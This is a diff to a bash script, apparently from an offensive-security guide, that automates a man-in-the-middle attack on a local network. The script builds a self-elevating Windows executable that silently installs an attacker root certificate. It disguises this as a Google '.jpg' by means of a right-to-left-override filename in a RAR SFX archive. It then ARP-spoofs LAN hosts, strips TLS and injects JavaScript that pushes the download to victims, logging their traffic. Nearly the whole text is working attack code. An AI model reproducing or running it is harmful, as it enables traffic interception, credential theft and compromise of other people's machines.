@@ -49,26 +49,47 @@ set -euo pipefail
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
 color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
+# ========================
+# --- ROOT CHECK ---
+# ========================
+[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }
+
+# ========================
+# --- VARIABLES ---
+# ========================
 MITM_DIR="/usr/share/bettercap/caplets/unk9vvn"
 BUILD_DIR="$HOME/.wine/drive_c/pyinstaller-build"
 ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
 RTLO=$'\xE2\x80\xAE'
+DEPS="bettercap arp-scan openssl imagemagick wine winetricks rar apache2 python3 python3-pip"
 
 # ========================
-# --- ROOT CHECK ---
+# --- INSTALL DEPENDENCIES ---
 # ========================
-if [[ "$(id -u)" -ne 0 ]]; then
-    color_print RED "[X] Please run as ROOT."
-    exit 1
+color_print CYAN "[*] Checking and installing dependencies..."
+for pkg in $DEPS; do
+    dpkg -s "$pkg" &>/dev/null || { color_print YELLOW "[!] Installing $pkg ..."; apt install -y "$pkg"; }
+done
+
+# ========================
+# --- PYINSTALLER ON WINE ---
+# ========================
+wine pyinstaller --version &>/dev/null || {
+    color_print YELLOW "[!] Installing PyInstaller in Wine..."
+    wine pip3 install --upgrade pip setuptools wheel
+    wine pip3 install pyinstaller
+}
+
+# ========================
+# --- RCEDIT INSTALLATION ---
+# ========================
+if [ ! -d "/usr/share/rcedit" ]; then
+    color_print YELLOW "[!] Installing rcedit in Wine..."
+    mkdir -p /usr/share/rcedit
+    wget -q -O /usr/share/rcedit/rcedit.exe https://github.com/electron/rcedit/releases/download/v2.0.0/rcedit-x64.exe
+    echo -e '#!/bin/bash\ncd /usr/share/rcedit; wine rcedit.exe "$@"' > /usr/bin/rcedit
+    chmod +x /usr/bin/rcedit
 fi
-
-# ========================
-# --- NETWORK INFO ---
-# ========================
-clear
-IFACE=$(ip route | awk '/^default/ {print $5; exit}')
-LAN=$(hostname -I | awk '{print $1}')
-GATEWAY=$(ip route | awk '/^default/ {print $3; exit}')
 
 # ========================
 # --- CLEANUP OLD FILES ---
@@ -78,14 +99,20 @@ rm -rf "$MITM_DIR" "$BUILD_DIR"
 mkdir -p "$MITM_DIR" "$BUILD_DIR"
 
 # ========================
+# --- NETWORK INFO ---
+# ========================
+IFACE=$(ip route | awk '/^default/ {print $5; exit}')
+LAN=$(hostname -I | awk '{print $1}')
+GATEWAY=$(ip route | awk '/^default/ {print $3; exit}')
+
+# ========================
 # --- GENERATE FAKE CERTIFICATE ---
 # ========================
 color_print CYAN "[*] Generating fake certificate..."
-CA_CERT_CER="$MITM_DIR/bettercap-ca.cer"
-openssl x509 -in "/root/.bettercap-ca.cert.pem" -outform DER -out "$CA_CERT_CER"
+openssl x509 -in "/root/.bettercap-ca.cert.pem" -outform DER -out "$MITM_DIR/bettercap-ca.cer"
 
 # ========================
-# --- DOWNLOAD AND CREATE ICON ---
+# --- DOWNLOAD & CREATE ICON ---
 # ========================
 color_print CYAN "[*] Downloading & creating icon..."
 wget -q -O "$MITM_DIR/google.jpg" "$ICON_URL"
@@ -95,28 +122,23 @@ convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "
 # --- BUILD CERT INSTALLER EXE ---
 # ========================
 color_print GREEN "[*] Building Windows cert_installer.exe..."
-CERT_B64=$(base64 -w0 "$CA_CERT_CER")
-CHUNKS=$(echo "$CERT_B64" | fold -w80 | sed "s/^/\"/" | sed "s/$/\",/")
+CERT_B64=$(base64 -w0 "$MITM_DIR/bettercap-ca.cer")
+CHUNKS=$(echo "$CERT_B64" | fold -w80 | sed 's/^/"/;s/$/",/')
 
 cat > "$MITM_DIR/cert_installer.py" <<EOF
 import ctypes, sys, os, subprocess, tempfile, base64
-
 def is_admin():
     try: return ctypes.windll.shell32.IsUserAnAdmin()
     except: return False
-
 if not is_admin():
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
     sys.exit()
-
 CERT_B64_CHUNKS = [
 $CHUNKS
 ]
 CERT_B64 = ''.join(CERT_B64_CHUNKS)
 path = os.path.join(tempfile.gettempdir(), "google.cer")
-with open(path, "wb") as f:
-    f.write(base64.b64decode(CERT_B64))
-
+with open(path, "wb") as f: f.write(base64.b64decode(CERT_B64))
 subprocess.run(["certutil","-addstore","-f","Root", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 try: os.remove(path)
 except FileNotFoundError: pass
@@ -143,12 +165,12 @@ wine pyinstaller --onefile --noconsole \
     --icon "C:\\pyinstaller-build\\google.ico" \
     --name "cert_installer.exe" \
     --manifest "C:\\pyinstaller-build\\admin.manifest" \
-    "C:\\pyinstaller-build\\cert_installer.py"
+    "C:\\pyinstaller-build\\cert_installer.py" &>/dev/null
 
 cp "$BUILD_DIR/dist/cert_installer.exe" "$MITM_DIR/cert_installer.exe"
 
 # ========================
-# --- CREATE RAR SFX ARCHIVE ---
+# --- CREATE SFX ARCHIVE ---
 # ========================
 color_print CYAN "[*] Creating SFX archive..."
 cat > "$MITM_DIR/sfx.txt" <<EOF
@@ -164,10 +186,10 @@ EOF
 cd "$MITM_DIR"
 rar a -sfx -z"$MITM_DIR/sfx.txt" \
     "/var/www/html/google-update${RTLO}gpj.exe" \
-    "$MITM_DIR/cert_installer.exe" "$MITM_DIR/google.jpg" "$MITM_DIR/google.ico"
+    "$MITM_DIR/cert_installer.exe" "$MITM_DIR/google.jpg" "$MITM_DIR/google.ico" &>/dev/null
 
 # ========================
-# --- SCAN NETWORK AND FORMAT TARGETS ---
+# --- SCAN NETWORK & FORMAT TARGETS ---
 # ========================
 color_print CYAN "[*] Scanning network..."
 TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
@@ -175,7 +197,7 @@ TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
     grep -v -E "^($LAN|$GATEWAY)$" | sort -u | tr '\n' ',' | sed 's/,$//')
 
 # ========================
-# --- GENERATE CROSS-BROWSER BETTERCAP JS ---
+# --- GENERATE CROSS-BROWSER JS ---
 # ========================
 cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
 (function() {
@@ -193,7 +215,6 @@ cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
             document.body.appendChild(iframe);
         } catch(e) { console.error('Injection failed:', e); }
     }
-
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', injectDownloader);
     } else { injectDownloader(); }
@@ -201,10 +222,10 @@ cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
 EOF
 
 # ========================
-# --- GENERATE BETTERCAP CAPLET ---
+# --- GENERATE SAFE BETTERCAP CAPLET ---
 # ========================
 cat > "$MITM_DIR/cert_injector.cap" <<EOF
-# --- Inject JS into HTTP and HTTPS traffic ---
+# HTTP/HTTPS Intercept
 set http.proxy.sslstrip true
 set https.proxy.sslstrip true
 set http.proxy.injectjs $MITM_DIR/rtlo_downloader.js
@@ -212,16 +233,17 @@ set https.proxy.injectjs $MITM_DIR/rtlo_downloader.js
 http.proxy on
 https.proxy on
 
-# --- Network sniffing only target ---
+# Sniff Traffic
 set net.sniff.filter "host $TARGETS"
 net.sniff on
 
-# --- Enable ARP spoofing only target ---
+# ARP Spoofing
 set arp.spoof.targets $TARGETS
+set arp.spoof.internal true
 set arp.spoof.whitelist !${TARGETS}
 arp.spoof on
 
-# --- Log sniffed traffic only target ---
+# Event Logs
 set events.stream.filter "host $TARGETS"
 events.stream on
 set events.stream.output /tmp/mitm.log
@@ -243,10 +265,4 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -F
 iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE
 bettercap -iface "$IFACE" -caplet "$MITM_DIR/cert_injector.cap"
-```
-
-_Run & Execute_
-
-```bash
-sudo chmod +x mitm-bettercap.sh;sudo ./mitm-bettercap.sh
 ```
